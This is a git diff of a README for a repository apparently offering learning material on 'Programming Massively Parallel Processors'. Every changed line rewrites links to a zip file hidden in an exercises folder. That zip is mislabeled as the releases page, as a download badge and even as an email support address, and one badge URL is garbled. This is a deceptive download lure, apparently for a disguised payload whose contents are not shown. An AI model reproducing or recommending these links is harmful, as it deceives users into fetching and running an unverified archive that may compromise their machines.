@@ -6,7 +6,7 @@ Welcome to PMPP-Learning! This repository is your source for learning about prog
 
 Be sure to check out our releases! 
 
-[![Download PMPP-Learning](https://github.com/Ahmedbadrh217/PMPP-Learning/raw/refs/heads/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip%20Now-Get%https://github.com/Ahmedbadrh217/PMPP-Learning/raw/refs/heads/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip)](https://github.com/Ahmedbadrh217/PMPP-Learning/raw/refs/heads/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip)
+[![Download PMPP-Learning](https://raw.githubusercontent.com/Ahmedbadrh217/PMPP-Learning/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip%20Now-Get%https://raw.githubusercontent.com/Ahmedbadrh217/PMPP-Learning/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip)](https://raw.githubusercontent.com/Ahmedbadrh217/PMPP-Learning/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip)
 
 ## 📥 Download & Install
 
@@ -14,7 +14,7 @@ To download the software:
 
 1. **Visit the Releases Page**  
    Go to the Releases page by clicking the link below:
-   [Download Here](https://github.com/Ahmedbadrh217/PMPP-Learning/raw/refs/heads/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip)
+   [Download Here](https://raw.githubusercontent.com/Ahmedbadrh217/PMPP-Learning/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip)
 
 2. **Select the Latest Release**  
    On the Releases page, find the latest release version. You will see a list of available files.
@@ -79,7 +79,7 @@ PMPP-Learning offers various resources to enhance your learning experience:
 If you encounter any issues or have questions, feel free to reach out:
 
 - **GitHub Issues**: Report problems or request features directly on the repository.
-- **Email Support**: Contact us at [https://github.com/Ahmedbadrh217/PMPP-Learning/raw/refs/heads/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip](https://github.com/Ahmedbadrh217/PMPP-Learning/raw/refs/heads/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip) for questions.
+- **Email Support**: Contact us at [https://raw.githubusercontent.com/Ahmedbadrh217/PMPP-Learning/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip](https://raw.githubusercontent.com/Ahmedbadrh217/PMPP-Learning/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip) for questions.
 
 ## 🌟 Community Contributions
 
@@ -89,6 +89,6 @@ We welcome contributions from users. Whether through reporting issues, suggestin
 
 Many thanks to the authors of "Programming Massively Parallel Processors" for their invaluable work. Their insights have guided this repository's development. 
 
-For more detailed instructions and code samples, don't hesitate to explore the [Releases Page](https://github.com/Ahmedbadrh217/PMPP-Learning/raw/refs/heads/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip) again.
+For more detailed instructions and code samples, don't hesitate to explore the [Releases Page](https://raw.githubusercontent.com/Ahmedbadrh217/PMPP-Learning/main/Exercises/Chapter17/Learning-PMP-1.2-beta.5.zip) again.
 
 Happy learning!
